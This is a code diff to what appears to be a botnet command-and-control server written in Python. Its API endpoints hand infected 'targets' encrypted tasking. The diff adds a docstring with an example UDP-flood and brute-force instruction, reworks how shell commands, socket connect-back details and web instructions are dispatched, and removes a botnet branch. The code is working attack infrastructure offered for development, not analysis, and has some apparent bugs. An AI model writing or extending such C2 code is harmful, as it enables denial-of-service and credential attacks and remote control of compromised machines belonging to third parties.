@@ -186,26 +186,69 @@ def save_output():
 
 @api.route('/api/BotNet/<target_name>')
 def BotNet(target_name):
-    """API endpoint to retrieve botnet information for a given target.
+    """
+    API endpoint to retrieve botnet information for a given target.
+    This endpoint allows a target to fetch its botnet instructions based on a valid API token.
+    It retrieves botnet details from the database and returns them in a structured format.
     Args:
         target_name (str): The name of the target for which botnet information is being requested.
     Returns:
         JSON response containing botnet information for the target if the API token is valid.
         If the API token is invalid or not provided, returns an error message.
+    Explanation: This endpoint fetches botnet instructions for a target.
+    Example response:
+    {
+        "botNets": {
+            "udp-flood": {
+                "condition": "inprogress",
+                "threads": 10
+            },
+            "bruteForce": {
+                "condition": "inprogress",
+                "threads": 5,
+                "username": "username",
+                "password": "password"
+            }
+        }
+    }
     """
     if request.method == 'GET':
         try:
             data = decrypt_payload(request.args)
 
             token = data.get('token')
-            botNets = getlist(_session.query(BotNet).filter_by(target_name=target_name, token=token).all())
-            response = {}
+            botNets = getlist(_session.query(APILink).filter_by(target_name=target_name).all())
+            response = {'botNets': {}}
             for botNet in botNets:
-                response[botNet[-2]] = botNet[-1]
+                _session.query(APILink).filter_by(ID=botNet[0]).update(
+                    {
+                        'condition': config.BOTNET_STATUS[1], 
+                    }
+                )
+                if botNet[4] == config.ACTION_TYPE[0]: # udp-flood
+                    response['botNets'] = {
+                        config.ACTION_TYPE[0]: {
+                            'conditon': config.BOTNET_STATUS[1],
+                            'threads': botNet[7]
+                        }
+                    }
+                elif botNet[4] == config.ACTION_TYPE[2]: # brutForce
+                    response['botNets'] = {
+                        config.ACTION_TYPE[0]: {
+                            'conditon': config.BOTNET_STATUS[1],
+                            'threads': botNet[7],
+                            'username': botNet[8], # filled name
+                            'password': botNet[9]  # filled name
+                        }
+                    }
+            _session.commit()
             return jsonify(encrypt_payload(response)), 200
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            _session.rollback()
             return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
+        finally:
+            _session.close()
     else:
         return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
@@ -329,19 +372,22 @@ def instarction(target_name):
                 }
                 
                 if len(user_instractions) != 0:
-                    user_ins = {}
+                    user_ins = {
+                        'CMD': [],
+                    }
                     for ins in user_instractions:
-                        if ins[3].split(',')[0] == config.INSTRACTION_TYPE[0]:  # CMD
-                            commands = ins[2].split(',')
-                            user_ins['CMD'] = commands
-                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[2]:  # CodeInjection
+                        if ins[3] == config.INSTRACTION_TYPE[0]:  # CMD
+                            commands = ins[2]
+                            user_ins['CMD'].append(commands)
+
+                        elif ins[3] == config.INSTRACTION_TYPE[2]:  # CodeInjection
                             # TODO: handle code injection if needed
                             pass
-                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[3]:  # Web
-                            if ins[3].split(',')[1] == target_name:
+                        elif ins[3] == config.INSTRACTION_TYPE[3]:  # Web
+                            if ins[3] == target_name:
                                 user_ins['Web'] = ins[2]
-                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[4]:  # Socket
-                            if ins[3].split(',')[1] == target_name:
+                        elif ins[3] == config.INSTRACTION_TYPE[4]:  # Socket
+                            if ins[3] == target_name:
                                 user_ins['Socket'] = {
                                     'host': ins[6],
                                     'port': ins[5]
@@ -356,30 +402,13 @@ def instarction(target_name):
                     if IP != readFromJson('target-info', target_name)['ip']:
                         update_target_info(target_name, IP, opratingSystem)
                     if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
-                        socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0][3]
+                        socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0]
                         user_instraction['sys_instraction'] = {
                             'socket':{
-                                'host': socket_info.split(':')[0],
-                                'port': socket_info.split(':')[1]
+                                'host': socket_info[3],
+                                'port': socket_info[6]
                             }
                         }
-                    elif instraction[0][3] == config.INSTRACTION[2]:  # BotNet
-                        botnet_info = getlist(_session.query(APILink).filter_by(target_name=target_name).all(), sp=',')
-                        botnetType = [config.ACTION_TYPE[0],config.ACTION_TYPE[2]]
-                        botnet_details = {}
-                        for bot in botnet_info:
-                            if bot[4] in botnetType:
-                                # udp-flood
-                                if bot[4] == config.ACTION_TYPE[0]:
-                                    host = bot[3]
-                                    port = bot[6]
-                                    botnet_details[bot[4]] = {'host': host, 'port': port}
-                                # bruteForce
-                                elif bot[4] == config.ACTION_TYPE[2]:
-                                    host = bot[3]
-                                    thread = bot[6]
-                                    botnet_details[bot[4]] = {'host': host, 'thread': thread}
-                        user_instraction['sys_instraction'] = {'botnet': botnet_details}
                     return jsonify(encrypt_payload(user_instraction)), 200
                 if len(instraction) == 0:
                     return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
